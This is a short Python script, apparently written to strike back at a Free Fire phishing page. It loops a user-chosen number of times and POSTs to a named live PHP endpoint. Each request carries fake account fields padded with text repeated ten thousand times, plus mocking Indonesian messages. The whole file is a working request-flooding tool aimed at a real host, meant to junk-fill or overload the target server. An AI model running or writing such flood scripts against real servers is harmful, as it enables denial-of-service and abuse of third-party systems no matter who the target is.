import requests

url = 'https://jajsjsjs.huftjs.art/free-fire/checkAccount.php'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
}

loop_value = int(input("bar bar brp kali? : "))

for i in range(1, loop_value+1):
    email      = str(i)+'TOLOLLL.BET.JADI.ORANG.WKWWKWK'*10000+'@gbapakkau.cok'
    userIdForm = "666932100"+str(i)
    password   = 'MAKASIH SPAM BERHASIL '*10000+str(i)
    
    data = {
        'email'      : email,
        'password'   : password,
        'login'      : 'Facebook',
        'userIdForm' : userIdForm,
        'nickname'   : 'player 43665570006',
        'level'      : '100',
        'tier'       : 'Grand Master',
    }
    
    response = requests.post(url, data=data, headers=headers)
    print("bang udah bang", i)
